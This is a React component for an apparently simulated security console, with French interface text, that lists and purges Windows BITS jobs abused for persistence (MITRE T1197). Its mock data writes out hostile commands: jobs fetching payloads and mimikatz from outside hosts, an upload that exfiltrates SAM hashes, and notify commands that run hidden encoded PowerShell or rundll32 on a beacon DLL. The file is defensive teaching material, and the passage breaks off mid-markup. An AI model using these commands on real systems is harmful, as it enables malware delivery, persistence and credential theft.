import React, { useState } from 'react';
import {
  Radio,
  RefreshCw,
  Ban,
  Trash2,
  CheckCircle2,
  AlertTriangle,
  Play,
  Pause,
  Download,
  Upload,
  ExternalLink,
  ShieldAlert,
  Copy,
  Check,
  Zap,
  Info,
  Terminal,
  FileCode,
  Search,
  Filter,
  Plus
} from 'lucide-react';

export interface BITSJobItem {
  id: string;
  jobName: string;
  owner: string;
  state: 'TRANSFERRING' | 'SUSPENDED' | 'ACKNOWLEDGED' | 'ERROR' | 'QUEUED';
  direction: 'DOWNLOAD' | 'UPLOAD_EXFIL';
  remoteUrl: string;
  localPath: string;
  transferredBytes: string;
  isSuspicious: boolean;
  threatDetails?: string;
  mitreTactic?: string;
  notifyCmdLine?: string;
  priority?: 'FOREGROUND' | 'HIGH' | 'NORMAL' | 'LOW';
  creationTime?: string;
}

interface BITSTaskManagerProps {
  onRunInConsole?: (command: string) => void;
}

export const BITSTaskManager: React.FC<BITSTaskManagerProps> = ({ onRunInConsole }) => {
  const [searchTerm, setSearchTerm] = useState('');
  const [filterSeverity, setFilterSeverity] = useState<'ALL' | 'SUSPICIOUS' | 'LEGITIMATE'>('ALL');
  const [copiedScript, setCopiedScript] = useState(false);
  const [actionSuccessMessage, setActionSuccessMessage] = useState<string | null>(null);
  const [selectedJob, setSelectedJob] = useState<BITSJobItem | null>(null);
  const [isSimulateModalOpen, setIsSimulateModalOpen] = useState(false);

  // Initial BITS Jobs database with real-world persistence and exfiltration vectors
  const [jobs, setJobs] = useState<BITSJobItem[]>([
    {
      id: '{8F3C-41A9-E20B-78D1}',
      jobName: 'WindowsUpdateHelper',
      owner: 'NT AUTHORITY\\SYSTEM',
      state: 'TRANSFERRING',
      direction: 'DOWNLOAD',
      remoteUrl: 'http://185.220.101.4/payload.bin',
      localPath: 'C:\\Users\\User\\AppData\\Local\\Temp\\stage2.bin',
      transferredBytes: '1.42 MB / 2.80 MB (51%)',
      isSuspicious: true,
      threatDetails: 'Téléchargement furtif de payload C2 Trojan.Swisyn contournant le pare-feu applicatif',
      mitreTactic: 'T1197 - BITS Jobs / T1105 - Ingress Tool Transfer',
      notifyCmdLine: 'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\User\\AppData\\Local\\Temp\\stage2.bin',
      priority: 'NORMAL',
      creationTime: 'Aujourd\'hui, 06:14:22',
    },
    {
      id: '{3C7D-90E1-A42F-1197}',
      jobName: 'DiagnosticDataExfil',
      owner: 'SYSTEM',
      state: 'SUSPENDED',
      direction: 'UPLOAD_EXFIL',
      remoteUrl: 'http://45.154.255.89:8080/collect',
      localPath: 'C:\\ProgramData\\loot_archive.zip',
      transferredBytes: '840 KB / 840 KB (100% en attente d\'acquittement)',
      isSuspicious: true,
      threatDetails: 'Exfiltration silencieuse de credentials et hashes SAM compressés via HTTP POST asynchrone',
      mitreTactic: 'T1197 - BITS Jobs / T1048 - Exfiltration Over Alternative Protocol',
      notifyCmdLine: 'cmd.exe /c del C:\\ProgramData\\loot_archive.zip',
      priority: 'LOW',
      creationTime: 'Aujourd\'hui, 07:02:11',
    },
    {
      id: '{E50A-7782-B114-44FA}',
      jobName: 'ChromeUpdateTaskPersistent',
      owner: 'NT AUTHORITY\\LOCAL SERVICE',
      state: 'TRANSFERRING',
      direction: 'DOWNLOAD',
      remoteUrl: 'http://evil-c2-cdn.org/beacon.dll',
      localPath: 'C:\\Windows\\System32\\spool\\drivers\\color\\beacon.dll',
      transferredBytes: '320 KB / 1.15 MB (27%)',
      isSuspicious: true,
      threatDetails: 'Persistance par Notification Command Line déclenchant une DLL injection à l\'achèvement du téléchargement',
      mitreTactic: 'T1197 - BITS Jobs / T1574.002 - DLL Side-Loading',
      notifyCmdLine: 'rundll32.exe C:\\Windows\\System32\\spool\\drivers\\color\\beacon.dll,DllRegisterServer',
      priority: 'NORMAL',
      creationTime: 'Aujourd\'hui, 08:45:00',
    },
    {
      id: '{D42E-1197-00AA-8812}',
      jobName: 'WU-DefinitionUpdate',
      owner: 'NT AUTHORITY\\NETWORK SERVICE',
      state: 'ACKNOWLEDGED',
      direction: 'DOWNLOAD',
      remoteUrl: 'http://download.windowsupdate.com/msdownload/update/v3/def.cab',
      localPath: 'C:\\Windows\\SoftwareDistribution\\Download\\def.cab',
      transferredBytes: '14.2 MB / 14.2 MB (Terminé)',
      isSuspicious: false,
      threatDetails: 'Tâche système Microsoft Windows Update légitime de mise à jour des signatures antivirales',
      mitreTactic: 'Légitime (Microsoft Update)',
      priority: 'NORMAL',
      creationTime: 'Aujourd\'hui, 04:30:19',
    },
    {
      id: '{11A2-990B-55CC-2024}',
      jobName: 'EdgeBrowserUpdateBackground',
      owner: 'NT AUTHORITY\\SYSTEM',
      state: 'TRANSFERRING',
      direction: 'DOWNLOAD',
      remoteUrl: 'http://msedge.b.tlu.dl.delivery.mp.microsoft.com/filestreamingservice/files/edge_patch.msi',
      localPath: 'C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\Download\\edge_patch.msi',
      transferredBytes: '45.1 MB / 88.0 MB (51%)',
      isSuspicious: false,
      threatDetails: 'Téléchargement planifié du composant Edge WebView2 Runtime officiel',
      mitreTactic: 'Légitime (Edge Delivery)',
      priority: 'LOW',
      creationTime: 'Aujourd\'hui, 05:12:00',
    },
  ]);

  // New simulated task form state
  const [newJobName, setNewJobName] = useState('MalwareBeaconTransfer');
  const [newRemoteUrl, setNewRemoteUrl] = useState('http://194.26.29.112/mimikatz.exe');
  const [newLocalPath, setNewLocalPath] = useState('C:\\Users\\Public\\mimikatz.exe');
  const [newNotifyCmd, setNewNotifyCmd] = useState('powershell.exe -w hidden -enc SQBFAFgA...');
  const [newDirection, setNewDirection] = useState<'DOWNLOAD' | 'UPLOAD_EXFIL'>('DOWNLOAD');

  const showToast = (msg: string) => {
    setActionSuccessMessage(msg);
    setTimeout(() => setActionSuccessMessage(null), 4000);
  };

  const handleCancelJob = (job: BITSJobItem) => {
    const cmd = `bitsadmin /cancel ${job.id}`;
    if (onRunInConsole) onRunInConsole(cmd);
    setJobs(prev => prev.filter(j => j.id !== job.id));
    if (selectedJob?.id === job.id) setSelectedJob(null);
    showToast(`Tâche BITS ${job.jobName} [${job.id}] annulée et purgée de la file d'attente.`);
  };

  const handleCompleteJob = (job: BITSJobItem) => {
    const cmd = `bitsadmin /complete ${job.id}`;
    if (onRunInConsole) onRunInConsole(cmd);
    setJobs(prev => prev.map(j => j.id === job.id ? { ...j, state: 'ACKNOWLEDGED' } : j));
    showToast(`Tâche BITS ${job.jobName} marquée comme complétée/acquittée.`);
  };

  const handleSuspendJob = (job: BITSJobItem) => {
    const cmd = `bitsadmin /suspend ${job.id}`;
    if (onRunInConsole) onRunInConsole(cmd);
    setJobs(prev => prev.map(j => j.id === job.id ? { ...j, state: 'SUSPENDED' } : j));
    showToast(`Tâche BITS ${job.jobName} suspendue (transfert gelé).`);
  };

  const handleResumeJob = (job: BITSJobItem) => {
    const cmd = `bitsadmin /resume ${job.id}`;
    if (onRunInConsole) onRunInConsole(cmd);
    setJobs(prev => prev.map(j => j.id === job.id ? { ...j, state: 'TRANSFERRING' } : j));
    showToast(`Tâche BITS ${job.jobName} reprise en arrière-plan.`);
  };

  const handlePurgeAllSuspicious = () => {
    const suspiciousJobs = jobs.filter(j => j.isSuspicious);
    if (suspiciousJobs.length === 0) return;

    if (onRunInConsole) onRunInConsole('bits-clean');
    setJobs(prev => prev.filter(j => !j.isSuspicious));
    if (selectedJob?.isSuspicious) setSelectedJob(null);
    showToast(`Éradication complète : ${suspiciousJobs.length} tâches BITS malveillantes purgées.`);
  };

  const handleAddSimulatedTask = () => {
    if (!newJobName.trim() || !newRemoteUrl.trim() || !newLocalPath.trim()) return;

    const newJob: BITSJobItem = {
      id: `{${Math.random().toString(36).substring(2, 6).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}-1197-${Math.random().toString(36).substring(2, 6).toUpperCase()}}`,
      jobName: newJobName.trim(),
      owner: 'NT AUTHORITY\\SYSTEM',
      state: 'TRANSFERRING',
      direction: newDirection,
      remoteUrl: newRemoteUrl.trim(),
      localPath: newLocalPath.trim(),
      transferredBytes: '0 KB / 4.12 MB (0%)',
      isSuspicious: true,
      threatDetails: 'Tâche BITS simulée pour validation des règles de détection EDR et purge active',
      mitreTactic: 'T1197 - BITS Jobs Persistence',
      notifyCmdLine: newNotifyCmd.trim() || undefined,
      priority: 'HIGH',
      creationTime: 'À l\'instant',
    };

    setJobs(prev => [newJob, ...prev]);
    setIsSimulateModalOpen(false);
    showToast(`Nouvelle tâche BITS suspecte "${newJob.jobName}" injectée dans la file.`);
    if (onRunInConsole) {
      onRunInConsole(`bitsadmin /create ${newJob.jobName} && bitsadmin /addfile ${newJob.jobName} "${newJob.remoteUrl}" "${newJob.localPath}"`);
    }
  };

  const handleCopyPowerShellEradicationScript = () => {
    const script = `# ==============================================================
# SpaceSec Ultra - BITS Eradication & Forensic Hunting Script
# MITRE ATT&CK: T1197 (Background Intelligent Transfer Service)
# ==============================================================

Write-Host "[*] Audit des tâches de transfert BITS actives..." -ForegroundColor Cyan

# 1. Lister toutes les tâches système BITS
$bitsJobs = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue

if ($bitsJobs.Count -eq 0) {
    Write-Host "[OK] Aucune tâche BITS en cours détectée." -ForegroundColor Green
} else {
    Write-Host "[!] $($bitsJobs.Count) tâche(s) BITS identifiée(s)." -ForegroundColor Yellow
}

# 2. Filtrer et éliminer les tâches malveillantes ou suspectes
foreach ($job in $bitsJobs) {
    $remote = $job.FileList.RemoteName
    $local = $job.FileList.LocalName
    Write-Host "-> Inspecte: $($job.DisplayName) | Source: $remote | Cible: $local"

    # Vérification des indicateurs de compromission
    $isMalicious = $false
    if ($remote -match "^http://\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}" -or 
        $local -match "\\\\Temp\\\\" -or 
        $local -match "\\\\AppData\\\\" -or 
        $job.DisplayName -match "Helper|Exfil|Beacon") {
        $isMalicious = $true
    }

    if ($isMalicious) {
        Write-Host "[CRITICAL] Tâche suspecte détectée ($($job.JobId)). Annulation immédiate..." -ForegroundColor Red
        Remove-BitsTransfer -BitsJob $job -Confirm:$false
        Write-Host "[+] Tâche BITS $($job.JobId) supprimée avec succès." -ForegroundColor Green

        # Supprimer le fichier partiellement téléchargé ou préparé
        if (Test-Path $local) {
            Remove-Item -Path $local -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Fichier résiduel $local effacé." -ForegroundColor Green
        }
    }
}

# 3. Purge radicale via l'utilitaire natif bitsadmin
bitsadmin /reset /allusers
Write-Host "[OK] File d'attente BITS entièrement réinitialisée." -ForegroundColor Green`;

    navigator.clipboard.writeText(script);
    setCopiedScript(true);
    setTimeout(() => setCopiedScript(false), 2000);
  };

  const filteredJobs = jobs.filter(job => {
    const matchesSearch =
      job.jobName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      job.remoteUrl.toLowerCase().includes(searchTerm.toLowerCase()) ||
      job.localPath.toLowerCase().includes(searchTerm.toLowerCase()) ||
      job.id.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (job.threatDetails && job.threatDetails.toLowerCase().includes(searchTerm.toLowerCase()));

    if (!matchesSearch) return false;

    if (filterSeverity === 'SUSPICIOUS') return job.isSuspicious;
    if (filterSeverity === 'LEGITIMATE') return !job.isSuspicious;
    return true;
  });

  const suspiciousCount = jobs.filter(j => j.isSuspicious).length;
  const legitimateCount = jobs.filter(j => !j.isSuspicious).length;

  return (
    <div className="space-y-6">
      {/* Top Banner */}
      <div className="p-6 bg-slate-900/90 border border-slate-800 rounded-xl relative overflow-hidden">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-4">
          <div className="max-w-3xl space-y-2">
            <div className="flex items-center gap-2">
              <span className="w-2.5 h-2.5 rounded-full bg-cyan-400 animate-pulse" />
              <span className="text-cyan-400 font-mono text-xs uppercase tracking-wider font-semibold">
                Windows NT BITS Engine · MITRE ATT&CK T1197
              </span>
            </div>
            <h2 className="text-2xl font-bold text-white tracking-tight font-['Plus_Jakarta_Sans']">
              BITS Task Manager (Background Intelligent Transfer Service)
            </h2>
            <p className="text-sm text-slate-300 leading-relaxed">
              Supervision temps réel et neutralisation des tâches asynchrones de transfert gérées par <code className="text-cyan-300 font-mono text-xs">svchost.exe (netsvcs)</code>.
              Les adversaires détournent BITS pour télécharger des malwares furtifs, exfiltrer des données par petits paquets et maintenir une persistance post-redémarrage via les déclencheurs <code className="text-amber-300 font-mono text-xs">-SetNotifyCmdLine</code>.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2.5 shrink-0">
            <button
              onClick={() => {
                if (onRunInConsole) onRunInConsole('bits');
                showToast('Audit des tâches BITS interrogé dans la console en direct.');
              }}
              className="flex items-center gap-2 px-3.5 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded-lg text-xs font-semibold transition-colors border border-slate-700 shadow-sm"
            >
              <RefreshCw className="w-3.5 h-3.5 text-cyan-400" />
              <span>Rafraîchir Flux</span>
            </button>

            <button
              onClick={() => setIsSimulateModalOpen(true)}
              className="flex items-center gap-2 px-3.5 py-2 bg-slate-800 hover:bg-slate-700 text-cyan-300 rounded-lg text-xs font-semibold transition-colors border border-cyan-800/60 shadow-sm"
            >
              <Plus className="w-3.5 h-3.5" />
              <span>Simuler Tâche C2</span>
            </button>

            {suspiciousCount > 0 && (
              <button
                onClick={handlePurgeAllSuspicious}
                className="flex items-center gap-2 px-4 py-2 bg-rose-600 hover:bg-rose-500 text-white rounded-lg text-xs font-bold transition-all shadow-md shadow-rose-950/40"
              >
                <Ban className="w-4 h-4" />
                <span>Purger Toutes les Tâches Malveillantes ({suspiciousCount})</span>
              </button>
            )}
          </div>
        </div>
      </div>

      {/* Action Toast Alert */}
      {actionSuccessMessage && (
        <div className="p-3.5 bg-emerald-950/90 border border-emerald-800 rounded-xl text-xs text-emerald-200 flex items-center justify-between gap-3 shadow-lg">
          <div className="flex items-center gap-2.5">
            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
            <span>{actionSuccessMessage}</span>
          </div>
          <button onClick={() => setActionSuccessMessage(null)} className="text-emerald-400 hover:text-emerald-200 text-xs">
            Fermer
          </button>
        </div>
      )}

      {/* KPI Cards Overview */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 font-mono text-xs">
        <div className="p-4 bg-slate-900 border border-slate-800 rounded-xl space-y-1">
          <div className="flex items-center justify-between text-slate-400 text-[11px] font-sans">
            <span className="flex items-center gap-1.5">
              <Radio className="w-3.5 h-3.5 text-cyan-400" />
              Total Tâches BITS
            </span>
            <span className="text-cyan-400">{jobs.length}</span>
          </div>
          <div className="text-xl font-bold text-white tabular-nums">
            {jobs.length} <span className="text-xs font-normal text-slate-400">enregistrées</span>
          </div>
          <div className="text-[11px] text-slate-500 font-sans">
            Gestionnaire de file d'attente Windows actif
          </div>
        </div>

        <div className="p-4 bg-slate-900 border border-slate-800 rounded-xl space-y-1">
          <div className="flex items-center justify-between text-slate-400 text-[11px] font-sans">
            <span className="flex items-center gap-1.5">
              <ShieldAlert className="w-3.5 h-3.5 text-rose-400" />
              Menaces & C2 Détectés
            </span>
            <span className="text-rose-400 font-bold">{suspiciousCount}</span>
          </div>
          <div className="text-xl font-bold text-rose-400 tabular-nums">
            {suspiciousCount} <span className="text-xs font-normal text-slate-400">tâches suspectes</span>
          </div>
          <div className="text-[11px] text-rose-300 font-sans">
            {suspiciousCount > 0 ? 'Purge prioritaire recommandée' : 'File assainie'}
          </div>
        </div>

        <div className="p-4 bg-slate-900 border border-slate-800 rounded-xl space-y-1">
          <div className="flex items-center justify-between text-slate-400 text-[11px] font-sans">
            <span className="flex items-center gap-1.5">
              <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
              Tâches Légitimes
            </span>
            <span className="text-emerald-400">{legitimateCount}</span>
          </div>
          <div className="text-xl font-bold text-emerald-400 tabular-nums">
            {legitimateCount} <span className="text-xs font-normal text-slate-400">système / Edge</span>
          </div>
          <div className="text-[11px] text-slate-500 font-sans">
            Signées numériquement par Microsoft
          </div>
        </div>

        <div className="p-4 bg-slate-900 border border-slate-800 rounded-xl space-y-1">
          <div className="flex items-center justify-between text-slate-400 text-[11px] font-sans">
            <span className="flex items-center gap-1.5">
              <Zap className="w-3.5 h-3.5 text-amber-400" />
              Persistance Notif Cmd
            </span>
            <span className="text-amber-400 font-bold">
              {jobs.filter(j => j.notifyCmdLine).length}
            </span>
          </div>
          <div className="text-xl font-bold text-amber-400 tabular-nums">
            {jobs.filter(j => j.notifyCmdLine).length} <span className="text-xs font-normal text-slate-400">avec callbacks</span>
          </div>
          <div className="text-[11px] text-slate-500 font-sans">
            Exécute du code à l'achèvement
          </div>
        </div>
      </div>

      {/* Educational Box on MITRE ATT&CK T1197 */}
      <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2 text-xs text-slate-300">
        <div className="flex items-center justify-between">
          <div className="font-semibold text-cyan-300 flex items-center gap-2 font-mono">
            <Info className="w-4 h-4 text-cyan-400" />
            <span>Anatomie de la persistance BITS (Background Intelligent Transfer Service) :</span>
          </div>
          <button
            onClick={handleCopyPowerShellEradicationScript}
            className="flex items-center gap-1.5 px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-cyan-300 rounded text-[11px] transition-colors border border-slate-700 font-mono"
          >
            {copiedScript ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
            <span>{copiedScript ? 'Copié (.ps1) !' : 'Copier Script d\'Éradication PowerShell'}</span>
          </button>
        </div>
        <p className="text-[11px] text-slate-400 leading-relaxed font-sans">
          Le service BITS (<code className="text-slate-300">bitsadmin.exe</code>, cmdlets <code className="text-slate-300">Start-BitsTransfer</code>) est conçu par Windows pour télécharger des mises à jour volumineuses avec limitation de débit. Les acteurs malveillants s'en servent pour :
          <br />
          1. <strong>Bypass Pare-feu & EDR</strong> : Le trafic HTTP/HTTPS part du processus légitime <code className="text-slate-300">svchost.exe</code> (compte SYSTEM).
          <br />
          2. <strong>Persistance indestructible</strong> : Une tâche BITS peut être configurée avec <code className="text-amber-300">-SetNotifyCmdLine "powershell.exe -enc ..."</code>. Même si le binaire malveillant initial est supprimé, Windows relancera le script dès que le transfert réussit ou échoue.
          <br />
          3. <strong>Exfiltration furtive</strong> : Les transferts peuvent être programmés en direction inversée (<code className="text-purple-300">Upload</code>) avec un seuil de débit minimal pour échapper aux IDS/IPS de détection d'anomalie réseau.
        </p>
      </div>

      {/* Filter and Search Bar */}
      <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3 bg-slate-900 p-3 rounded-xl border border-slate-800">
        <div className="relative flex-1">
          <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" />
          <input
            type="text"
            value={searchTerm}
            onChange={e => setSearchTerm(e.target.value)}
            placeholder="Filtrer par nom de tâche, GUID, URL distante, chemin local..."
            className="w-full pl-9 pr-4 py-2 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-cyan-500"
          />
        </div>

        <div className="flex items-center gap-1.5 shrink-0 bg-slate-950 p-1 rounded-lg border border-slate-800 text-xs">
          <Filter className="w-3.5 h-3.5 text-slate-500 ml-1.5 mr-0.5" />
          <button
            onClick={() => setFilterSeverity('ALL')}
            className={`px-3 py-1 rounded transition-colors ${
              filterSeverity === 'ALL'
                ? 'bg-cyan-950 text-cyan-300 font-bold border border-cyan-800/80'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            Toutes ({jobs.length})
          </button>
          <button
            onClick={() => setFilterSeverity('SUSPICIOUS')}
            className={`px-3 py-1 rounded transition-colors ${
              filterSeverity === 'SUSPICIOUS'
                ? 'bg-rose-950 text-rose-300 font-bold border border-rose-800/80'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            Suspectes / C2 ({suspiciousCount})
          </button>
          <button
            onClick={() => setFilterSeverity('LEGITIMATE')}
            className={`px-3 py-1 rounded transition-colors ${
              filterSeverity === 'LEGITIMATE'
                ? 'bg-emerald-950 text-emerald-300 font-bold border border-emerald-800/80'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            Légitimes ({legitimateCount})
          </button>
        </div>
      </div>

      {/* Main Table */}
      <div className="border border-slate-800 rounded-xl overflow-hidden bg-slate-900 shadow-xl">
        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs font-mono">
            <thead className="bg-slate-950 text-slate-400 border-b border-slate-800">
              <tr>
                <th className="py-3 px-3 font-semibold">Tâche BITS (Nom & GUID)</th>
                <th className="py-3 px-3 font-semibold">Type & Direction</th>
                <th className="py-3 px-3 font-semibold">Cible / URL C2 Distante</th>
                <th className="py-3 px-3 font-semibold">Destination Locale</th>
                <th className="py-3 px-3 font-semibold">Statut & Progression</th>
                <th className="py-3 px-3 font-semibold">Persistance / Notif</th>
                <th className="py-3 px-3 font-semibold text-right">Actions de Purge</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60 bg-slate-900/60">
              {filteredJobs.length === 0 ? (
                <tr>
                  <td colSpan={7} className="py-8 text-center text-slate-500 font-sans">
                    Aucune tâche BITS ne correspond à la recherche actuelle. File d'attente propre.
                  </td>
                </tr>
              ) : (
                filteredJobs.map(job => (
                  <tr
                    key={job.id}
                    className={`hover:bg-slate-800/40 transition-colors ${
                      job.isSuspicious ? 'bg-rose-950/10' : ''
                    } ${selectedJob?.id === job.id ? 'ring-1 ring-cyan-500 bg-cyan-950/20' : ''}`}
                    onClick={() => setSelectedJob(job)}
                  >
                    {/* Job Name & GUID */}
                    <td className="py-3 px-3">
                      <div className="flex items-center gap-2">
                        {job.isSuspicious ? (
                          <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0" />
                        ) : (
                          <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                        )}
                        <div>
                          <div className="font-bold text-slate-200 hover:text-cyan-300 cursor-pointer">
                            {job.jobName}
                          </div>
                          <div className="text-[10px] text-slate-500 font-mono">
                            {job.id}
                          </div>
                          <div className="text-[10px] text-slate-400">
                            Propriétaire: <span className="text-slate-300">{job.owner}</span>
                          </div>
                        </div>
                      </div>
                    </td>

                    {/* Direction */}
                    <td className="py-3 px-3 whitespace-nowrap">
                      {job.direction === 'UPLOAD_EXFIL' ? (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[10px] bg-purple-950 border border-purple-800 text-purple-300 font-semibold">
                          <Upload className="w-3 h-3" />
                          UPLOAD (Exfil)
                        </span>
                      ) : (
                        <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded text-[10px] bg-cyan-950 border border-cyan-800 text-cyan-300 font-semibold">
                          <Download className="w-3 h-3" />
                          DOWNLOAD
                        </span>
                      )}
                      <div className="text-[10px] text-slate-500 mt-1">
                        Prio: {job.priority || 'NORMAL'}
                      </div>
                    </td>

                    {/* Remote URL */}
                    <td className="py-3 px-3 max-w-[220px]">
                      <div
                        className={`truncate font-mono text-[11px] ${
                          job.isSuspicious ? 'text-rose-300 font-medium' : 'text-slate-300'
                        }`}
                        title={job.remoteUrl}
                      >
                        {job.remoteUrl}
                      </div>
                      {job.isSuspicious && (
                        <div className="text-[10px] text-rose-400 flex items-center gap-1 mt-0.5 font-sans">
                          <ShieldAlert className="w-3 h-3 shrink-0" />
                          <span>Hôte non répertorié / IP Directe</span>
                        </div>
                      )}
                    </td>

                    {/* Local Path */}
                    <td className="py-3 px-3 max-w-[200px]">
                      <div
                        className="truncate text-[11px] text-slate-300 font-mono"
                        title={job.localPath}
                      >
                        {job.localPath}
                      </div>
                    </td>

                    {/* State & Progress */}
                    <td className="py-3 px-3 whitespace-nowrap">
                      <div className="flex items-center gap-1.5">
                        <span
                          className={`w-2 h-2 rounded-full ${
                            job.state === 'TRANSFERRING'
                              ? 'bg-cyan-400 animate-ping'
                              : job.state === 'SUSPENDED'
                              ? 'bg-amber-400'
                              : job.state === 'ACKNOWLEDGED'
                              ? 'bg-emerald-400'
                              : 'bg-rose-400'
                          }`}
                        />
                        <span
                          className={`font-semibold ${
                            job.state === 'TRANSFERRING'
                              ? 'text-cyan-300'
                              : job.state === 'SUSPENDED'
                              ? 'text-amber-300'
                              : job.state === 'ACKNOWLEDGED'
                              ? 'text-emerald-300'
                              : 'text-rose-300'
                          }`}
                        >
                          {job.state}
                        </span>
                      </div>
                      <div className="text-[10px] text-slate-400 mt-0.5">
                        {job.transferredBytes}
                      </div>
                    </td>

                    {/* Persistence / Callback */}
                    <td className="py-3 px-3 max-w-[180px]">
                      {job.notifyCmdLine ? (
                        <div className="p-1.5 bg-amber-950/60 border border-amber-800/80 rounded text-[10px] text-amber-200">
                          <div className="font-bold flex items-center gap-1 text-amber-300">
                            <Zap className="w-3 h-3" />
                            <span>Callback Enregistré</span>
                          </div>
                          <div className="truncate font-mono mt-0.5 text-slate-300" title={job.notifyCmdLine}>
                            {job.notifyCmdLine}
                          </div>
                        </div>
                      ) : (
                        <span className="text-[11px] text-slate-500">Aucun callback</span>
                      )}
                    </td>

                    {/* Actions */}
                    <td className="py-3 px-3 text-right whitespace-nowrap">
                      <div className="flex items-center justify-end gap-1.5">
                        {job.state === 'TRANSFERRING' && (
                          <button
                            onClick={e => {
                              e.stopPropagation();
                              handleSuspendJob(job);
                            }}
                            title="Suspendre le transfert"
                            className="p-1.5 bg-slate-800 hover:bg-slate-700 text-amber-300 rounded border border-slate-700 transition-colors"
                          >
                            <Pause className="w-3.5 h-3.5" />
                          </button>
                        )}

                        {job.state === 'SUSPENDED' && (
                          <button
                            onClick={e => {
                              e.stopPropagation();
                              handleResumeJob(job);
                            }}
                            title="Reprendre le transfert"
                            className="p-1.5 bg-slate-800 hover:bg-slate-700 text-cyan-300 rounded border border-slate-700 transition-colors"
                          >
                            <Play className="w-3.5 h-3.5" />
                          </button>
                        )}

                        <button
                          onClick={e => {
                            e.stopPropagation();
                            handleCancelJob(job);
                          }}
                          title="Supprimer et purger cette tâche BITS"
                          className="flex items-center gap-1 px-2.5 py-1.5 bg-rose-600/90 hover:bg-rose-500 text-white rounded text-xs font-semibold transition-colors shadow-sm"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                          <span>Supprimer</span>
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>

      {/* Selected Job Forensic Drawer */}
      {selectedJob && (
        <div className="p-6 bg-slate-900 border border-cyan-800/80 rounded-xl space-y-4 shadow-xl">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div className="flex items-center gap-2">
              <FileCode className="w-4 h-4 text-cyan-400" />
              <h3 className="text-sm font-bold text-white font-['Plus_Jakarta_Sans']">
                Détails Forensiques de la Tâche : <span className="text-cyan-400 font-mono">{selectedJob.jobName}</span>
              </h3>
            </div>
            <div className="flex items-center gap-2">
              <button
                onClick={() => {
                  if (onRunInConsole) onRunInConsole(`bitsadmin /info ${selectedJob.id} /verbose`);
                  showToast(`Commande d'inspection détaillée bitsadmin exécutée pour ${selectedJob.id}`);
                }}
                className="flex items-center gap-1.5 px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded text-xs font-semibold"
              >
                <Terminal className="w-3 h-3 text-cyan-400" />
                <span>Inspecter dans le Terminal</span>
              </button>
              <button
                onClick={() => setSelectedJob(null)}
                className="text-xs text-slate-400 hover:text-slate-200 px-2 py-1"
              >
                Fermer
              </button>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 text-xs font-mono">
            <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 space-y-1">
              <span className="text-slate-500 text-[10px] block">GUID UNIQUE</span>
              <span className="text-slate-200 select-all font-semibold">{selectedJob.id}</span>
            </div>

            <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 space-y-1">
              <span className="text-slate-500 text-[10px] block">TACTIQUE MITRE ATT&CK</span>
              <span className="text-amber-300 font-semibold">{selectedJob.mitreTactic || 'T1197 - BITS Jobs'}</span>
            </div>

            <div className="p-3 bg-slate-950 rounded-lg border border-slate-800 space-y-1">
              <span className="text-slate-500 text-[10px] block">DATE DE CRÉATION</span>
              <span className="text-slate-200">{selectedJob.creationTime || 'Aujourd\'hui'}</span>
            </div>
          </div>

          {selectedJob.threatDetails && (
            <div className="p-3 bg-rose-950/40 border border-rose-800/60 rounded-lg text-xs space-y-1">
              <span className="font-bold text-rose-300 flex items-center gap-1.5">
                <AlertTriangle className="w-3.5 h-3.5" />
                Analyse Heuristique & Risque Cyber :
              </span>
              <p className="text-slate-300 font-sans text-xs">{selectedJob.threatDetails}</p>
            </div>
          )}

          {selectedJob.notifyCmdLine && (
            <div className="p-3 bg-amber-950/40 border border-amber-800/60 rounded-lg text-xs space-y-1">
              <span className="font-bold text-amber-300 flex items-center gap-1.5">
                <Zap className="w-3.5 h-3.5" />
                Commande Déclenchée Automatiquement (SetNotifyCmdLine) :
              </span>
              <pre className="p-2 bg-slate-950 rounded border border-amber-900/60 text-amber-200 overflow-x-auto text-[11px] font-mono">
                {selectedJob.notifyCmdLine}
              </pre>
            </div>
          )}

          <div className="flex items-center justify-end gap-2 pt-2">
            <button
              onClick={() => handleCancelJob(selectedJob)}
              className="flex items-center gap-2 px-4 py-2 bg-rose-600 hover:bg-rose-500 text-white rounded-lg text-xs font-bold transition-colors"
            >
              <Trash2 className="w-4 h-4" />
              <span>Détruire & Annuler la Tâche Définitivement</span>
            </button>
          </div>
        </div>
      )}

